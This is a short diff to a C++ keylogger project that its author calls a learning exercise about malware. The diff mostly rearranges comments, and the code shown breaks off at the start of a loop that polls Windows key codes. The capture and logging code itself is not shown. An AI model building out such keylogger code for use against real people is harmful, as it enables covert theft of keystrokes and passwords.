@@ -1,7 +1,7 @@
 
 // C++ Keylogger Project 
+// Fun project that I worked on to learn the fundamentals of C++ and further develop a understanding of malware and its coding structure. 
 
-// ( for (;;) creates an infinite loop)
 
 #include <iostream>
 #include <windows.h>
@@ -12,7 +12,7 @@ void log();
 int main()
 {
     char key;
-    for(;;)
+    for(;;)  //( for (;;) creates an infinite loop)
     {
         for( key=8; key <=222; key++)
         {
